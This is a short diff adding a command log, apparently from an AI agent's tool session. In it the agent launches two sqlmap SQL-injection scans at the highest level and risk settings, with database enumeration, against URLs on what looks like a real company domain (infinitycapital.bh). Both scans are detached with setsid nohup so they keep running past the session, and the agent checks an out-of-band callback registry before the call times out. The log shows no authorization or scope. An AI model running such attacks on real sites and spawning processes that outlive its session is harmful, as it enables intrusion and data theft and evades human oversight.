@@ -1,0 +1,12 @@
+# command: cd "$WORK_PATH"; setsid nohup sqlmap -u 'https://www.infinitycapital.bh/contact?cb=1&q=test&x=1' -p 'cb,q,x' --batch --level=5 --risk=3 --dbs --threads=2 --timeout=15 --retries=1 --output-dir=tool_outputs/sqc > tool_outputs/sqlmap_contact.log 2>&1 < /dev/null &
+setsid nohup sqlmap -u 'https://www.infinitycapital.bh/?id=1&page=2&search=test' -p 'id,page,search' --batch --level=5 --risk=3 --dbs --threads=2 --timeout=15 --retries=1 --output-dir=tool_outputs/sqr > tool_outputs/sqlmap_root.log 2>&1 < /dev/null &
+sleep 3; ls -la tool_outputs/sqlmap_contact.log tool_outputs/sqlmap_root.log; echo ---; ls -la /work/oob_registry.jsonl 2>/dev/null; grep -c . /work/oob_registry.jsonl 2>/dev/null
+# tool: setsid
+# exit_code: 124
+# ts: 2026-09-30T11:31:33.815562+00:00
+# ---
+
+
+[exec timeout after 300s]
+
+[exit=124]
